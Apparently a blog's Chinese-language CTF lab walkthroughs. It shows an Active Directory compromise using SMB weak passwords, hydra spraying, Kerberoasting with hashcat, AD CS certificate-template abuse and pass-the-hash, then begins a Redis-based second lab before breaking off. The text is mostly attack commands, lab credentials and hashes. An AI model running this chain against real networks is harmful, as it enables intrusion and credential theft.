172.22.9.26主机名: DESKTOP-CBKTVMO发现的网络接口: IPv4地址: └─ 172.22.9.26[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.47 状态码:200 长度:10918 标题:Apache2 Ubuntu Default Page: It works[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.7 状态码:200 长度:703 标题:IIS Windows Server[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7 DC:XIAORANG\\XIAORANG-DC[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果目标主机: 172.22.9.7主机名: XIAORANG-DC发现的网络接口: IPv4地址: └─ 172.22.9.7[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-17 00:41:12] [SUCCESS] SMB认证成功 172.22.9.47:445 administrator:123456[2025-04-17 00:41:12] [INFO] 系统信息 172.22.9.47 [Windows 6.1][2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47 fileserver Windows 6.1[2025-04-17 00:41:12] [INFO] SMB2共享信息 172.22.9.47:445 administrator Pass:123456 共享:[print$ fileshare IPC$][2025-04-17 00:41:12] [SUCCESS] 目标: http://172.22.9.7:80 漏洞类型: poc-yaml-active-directory-certsrv-detect 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/EasonJim/p/6859345.html 上来就扫到域控的漏洞了，但是现在还没有什么可用的信息没办法直接打。 172.22.9.47:445 smb服务存在一个弱口令登陆一下看看 1234567891011121314151617181920212223242526272829┌──(root㉿kali)-[~/Desktop/tmp]└─# smbclient //172.22.9.47/fileshare -U administrator%123465Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Jul 13 04:12:10 2022 .. D 0 Wed Jul 13 00:35:09 2022 personnel.db A 61440 Wed Jul 13 03:46:55 2022 secret D 0 Wed Apr 16 11:57:06 2025 Certified_Pre-Owned.7z N 9572925 Wed Jul 13 04:12:03 2022 Certified_Pre-Owned.pdf N 10406101 Wed Jul 13 04:08:14 2022 41152812 blocks of size 1024. 36033208 blocks availablesmb: \\&gt; cd ..smb: \\&gt; ls . D 0 Wed Jul 13 04:12:10 2022 .. D 0 Wed Jul 13 00:35:09 2022 personnel.db A 61440 Wed Jul 13 03:46:55 2022 secret D 0 Wed Apr 16 11:57:06 2025 Certified_Pre-Owned.7z N 9572925 Wed Jul 13 04:12:03 2022 Certified_Pre-Owned.pdf N 10406101 Wed Jul 13 04:08:14 2022 41152812 blocks of size 1024. 36033208 blocks availablesmb: \\&gt; cd secretsmb: \\secret\\&gt; ls . D 0 Wed Apr 16 11:57:06 2025 .. D 0 Wed Jul 13 04:12:10 2022 flag02.txt N 659 Wed Apr 16 11:57:06 2025 41152812 blocks of size 1024. 36033208 blocks available 找到flag02了 FLAG3&amp;FLAG4flag02.txt里还给了一个提示 1Yes, you have enumerated smb. But do you know what an SPN is? 把所有文件都下载下来看一看, 1234567891011121314sqlite&gt; select * from xr_users ;1|admin|admin2|******|i9XDE02pLVf3|******|6N70jt2K9sV4|******|fiAzGwEMgTYsqlite&gt; select * from xr_members ;1|huangmin|1|26|15220647319|huangmin@xiaorang.lab2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab3|liying|1|29|13126874319|liying@xiaorang.lab4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab7|liuying|1|24|13078310649|liuying@xiaorang.lab....... personnel.db里面有用户和3个不知道用户名的密码，先将数据处理一下吧，将xr_users和xr_members的内容分别保存到pass和user里 1234567891011121314151617181920212223242526272829┌──(root㉿kali)-[~/Desktop/tmp]└─# cat pass|awk -F&#x27;|&#x27; &#x27;&#123;print($3)&#125;&#x27;&gt;pass.txt┌──(root㉿kali)-[~/Desktop/tmp]└─# cat pass.txtadmini9XDE02pLVf6N70jt2K9sVfiAzGwEMgTY┌──(root㉿kali)-[~/Desktop/tmp]└─# cat user|awk -F&#x27;|&#x27; &#x27;&#123;print($2)&#125;&#x27; &gt;username.txt┌──(root㉿kali)-[~/Desktop/tmp]└─# cat username.txthuangminzhangrongliyingzhaolizhangyanzhoujingliuyingwanghaowangqiangwangluzhaoyongzhangliwangningwangyu... 用hydra爆破，可以爆破出来两个用户 1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# hydra -L username.txt -P pass.txt 172.22.9.26 smbHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task[DATA] attacking smb://172.22.9.26:445/[445][smb] host: 172.22.9.26 login: zhangjian password: i9XDE02pLVf[445][smb] host: 172.22.9.26 login: liupeng password: fiAzGwEMgTY 然后进行Kerberoast攻击 123456789101112131415┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVfImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companiesServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation------------------------------------- -------- -------- -------------------------- --------- ----------TERMSERV/desktop-cbktvmo.xiaorang.lab zhangxia 2023-07-14 00:45:45.213944 &lt;never&gt;WWW/desktop-cbktvmo.xiaorang.lab/IIS zhangxia 2023-07-14 00:45:45.213944 &lt;never&gt;TERMSERV/win2016.xiaorang.lab chenchen 2023-07-14 00:45:39.767035 &lt;never&gt;[-] CCache file is not found. Skipping...$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b 可以拿到两个用户的hash，用hashcat爆破 123456789101112hashcat hash /usr/share/wordlists/rockyou.txt┌──(root㉿kali)-[~/Desktop/tmp]└─# hashcat hash --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:13100 | Kerberos 5, etype 23, TGS-REP | Network ProtocolNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@ 然后用chenchen@xiaorang.lab:@Passw0rd@进行远程桌面登录,用bloodhound进行信息搜集（其实也不用，因为之前fscan已经扫到洞了） 1234567891011121314151617181920┌──(root㉿kali)-[~/Desktop/tmp]└─# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.labINFO: Found 95 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.labINFO: Querying computer: XIAORANG-DC.xiaorang.labINFO: Done in 00M 06SINFO: Compressing output into 20250416132802_bloodhound.zip 上传Certify.exe查找易受攻击的证书 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273C:\\Users\\chenchen\\Desktop\\新建文件夹&gt;Certify.exe find /vulnerable _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ &#x27;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0[*] Action: Find certificate templates[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27; Enterprise CA Name : xiaorang-XIAORANG-DC-CA DNS Hostname : XIAORANG-DC.xiaorang.lab FullName : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED Cert SubjectName : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab Cert Thumbprint : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E Cert Serial : 43A73F4A37050EAA4E29C0D95BC84BB5 Cert Start Date : 2023/7/14 12:33:21 Cert End Date : 2028/7/14 12:43:21 Cert Chain : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab UserSpecifiedSAN : Disabled CA Permissions : Owner: BUILTIN\\Administrators S-1-5-32-544 Access Rights Principal Allow Enroll NT AUTHORITY\\Authenticated UsersS-1-5-11 Allow ManageCA, ManageCertificates BUILTIN\\Administrators S-1-5-32-544 Allow ManageCA, ManageCertificates XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 Allow ManageCA, ManageCertificates XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 Enrollment Agent Restrictions : None[!] Vulnerable Certificates Templates : CA Name : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA Template Name : XR Manager Schema Version : 2 Validity Period : 1 year Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 pkiextendedkeyusage : 安全电子邮件, 加密文件系统, 客户端身份验证 mspki-certificate-application-policy : 安全电子邮件, 加密文件系统, 客户端身份验证 Permissions Enrollment Permissions Enrollment Rights : NT AUTHORITY\\Authenticated UsersS-1-5-11 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Domain Users S-1-5-21-990187620-235975882-534697781-513 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 Object Control Permissions Owner : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 WriteOwner Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 WriteDacl Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 WriteProperty Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519Certify completed in 00:00:10.1629693 12CA Name : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CATemplate Name : XR Manage 这个可以打 123456789101112131415161718192021┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.labCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 7[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;┌──(root㉿kali)-[~/Desktop/tmp]└─# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@xiaorang.lab[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 得到了administrator的哈希了，拿下域控了，直接登录这台主机和域控拿flag即可 1234┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-wmiexec --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Brute4Road","slug":"春秋云镜-Brute4Road","date":"2025-04-15T06:35:35.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/15/春秋云镜-Brute4Road/","permalink":"https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/","excerpt":"","text":"FLAG1&amp;FLAG2先用fscan扫一下 1234567891011121314151617181920212223242526272829303132┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.99.231.184┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1[2025-04-15 02:37:33] [INFO] 开始信息扫描[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1[2025-04-15 02:37:33] [INFO] 开始主机扫描[2025-04-15 02:37:33] [INFO] 有效端口数量: 233[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).][2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.][2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 =&gt; [http] 版本:1.20.1 产品:nginx[2025-04-15 02:37:43] [INFO] 存活端口数量: 4[2025-04-15 02:37:43] [INFO] 开始漏洞扫描[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184 状态码:200 长度:4833 标题:Welcome to CentOS[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功![2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5 打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取 1/usr/bin/base64 ./flag01|/usr/bin/base64 -d ftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106./fscan -h 172.22.2.7/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1[2025-04-15 15:22:58] [INFO] 开始信息扫描[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256[2025-04-15 15:22:58] [INFO] 开始主机扫描[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3 存活 (ICMP)[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7 存活 (ICMP)[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16 存活 (ICMP)[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18 存活 (ICMP)[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34 存活 (ICMP)[2025-04-15 15:23:04] [INFO] 存活主机数量: 5[2025-04-15 15:23:04] [INFO] 有效端口数量: 233[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.][2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).][2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; [2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http][2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows 